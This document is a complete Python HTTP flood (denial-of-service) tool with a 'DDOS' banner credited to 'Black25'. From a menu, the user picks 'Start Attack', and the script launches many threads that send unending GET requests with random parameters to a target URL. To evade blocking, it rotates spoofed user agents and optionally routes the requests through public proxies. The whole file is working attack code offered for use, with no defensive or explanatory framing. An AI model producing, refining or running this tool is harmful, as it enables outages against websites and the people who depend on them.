#!/usr/bin/env python3
import threading
import requests
import random
import string
import time
import sys

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    SCARY = '\033[5;31;40m'  # Make it look scary

def print_title():
    title = """
{}█
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██B   █▌░██   L█▌▒██░A  ██▒░K ▓██▄   25
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒Telegram:Black25
Black25 -_- *_* #######$#$##user:;@Bhyt6_5
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        (BLACK  )
{}""".format(bcolors.SCARY, bcolors.ENDC)
    print(title)

# Lists for user agents and proxies
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    # Add more user agents here for better randomization
]

proxies_list = [
    'http://192.168.1.1:8080', 'http://51.158.68.133:8811', 'http://178.128.163.157:3128',
    # Add more proxies here for better randomization
]

# Generate random data to send as GET parameters
def random_string(length=8):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# Create realistic HTTP headers
def random_headers():
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    return headers

# Function to perform HTTP GET request with random parameters and headers
def perform_attack(target_url, num_threads, use_proxies):
    def attack():
        try:
            while True:
                params = {random_string(): random_string() for _ in range(random.randint(5, 10))}  # Create random number of parameters
                headers = random_headers()
                
                if use_proxies:
                    proxy = {'http': random.choice(proxies_list), 'https': random.choice(proxies_list)}
                    response = requests.get(target_url, params=params, proxies=proxy, headers=headers)
                    print(f"{bcolors.OKGREEN}Request sent: {response.status_code}, Params: {params}, Proxy: {proxy}, Headers: {headers['User-Agent']}{bcolors.ENDC}")
                else:
                    response = requests.get(target_url, params=params, headers=headers)
                    print(f"{bcolors.OKGREEN}Request sent: {response.status_code}, Params: {params}, Headers: {headers['User-Agent']}{bcolors.ENDC}")
                
                time.sleep(random.uniform(0.05, 0.2))  # Add random delay to reduce load and make requests look natural
        except Exception as e:
            print(f"{bcolors.FAIL}Error: {e}{bcolors.ENDC}")

    # Create and launch threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    # Join threads (optional)
    for thread in threads:
        thread.join()

def main_menu():
    print_title()
    while True:
        print(f"{bcolors.WARNING}1. Start Attack{bcolors.ENDC}")
        print(f"{bcolors.OKCYAN}2. Add User Agent{bcolors.ENDC}")
        print(f"{bcolors.OKBLUE}3. Add Proxy{bcolors.ENDC}")
        print(f"{bcolors.HEADER}4. Check Number of Proxies{bcolors.ENDC}")
        print(f"{bcolors.SCARY}5. Reset and Delete All Proxies{bcolors.ENDC}")
        print(f"{bcolors.OKGREEN}6. Check Number of User Agents{bcolors.ENDC}")
        print(f"{bcolors.SCARY}7. Reset and Delete All User Agents{bcolors.ENDC}")
        print(f"{bcolors.FAIL}8. Exit{bcolors.ENDC}")
        choice = input(f"{bcolors.OKGREEN}Enter Your Choice :{bcolors.ENDC}")

        if choice == '1':
            target_url = input(f"{bcolors.OKBLUE}Enter the target URL: {bcolors.ENDC}")
            num_threads = int(input(f"{bcolors.OKBLUE}Enter the number of threads: {bcolors.ENDC}"))
            use_proxies = input(f"{bcolors.OKBLUE}Use proxies? (yes/no): {bcolors.ENDC}").strip().lower() == 'yes'
            perform_attack(target_url, num_threads, use_proxies)
        elif choice == '2':
            user_agent = input(f"{bcolors.OKCYAN}Enter a user agent: {bcolors.ENDC}")
            user_agents.append(user_agent)
            print(f"{bcolors.OKCYAN}User agent added.{bcolors.ENDC}")
        elif choice == '3':
            proxy = input(f"{bcolors.OKGREEN}Enter a proxy (format: http://IP:PORT): {bcolors.ENDC}")
            proxies_list.append(proxy)
            print(f"{bcolors.OKGREEN}Proxy added.{bcolors.ENDC}")
        elif choice == '4':
            print(f"{bcolors.WARNING}Number of proxies: {len(proxies_list)}{bcolors.ENDC}")
        elif choice == '5':
            proxies_list.clear()
            print(f"{bcolors.FAIL}All proxies have been deleted.{bcolors.ENDC}")
        elif choice == '6':
            print(f"{bcolors.BOLD}Number of user agents: {len(user_agents)}{bcolors.ENDC}")
        elif choice == '7':
            user_agents.clear()
            print(f"{bcolors.UNDERLINE}All user agents have been deleted.{bcolors.ENDC}")
        elif choice == '8':
            print(f"{bcolors.ENDC}Exiting...")
            sys.exit()
        else:
            print(f"{bcolors.FAIL}Invalid choice. Please try again.{bcolors.ENDC}")

if __name__ == "__main__":
    main_menu()

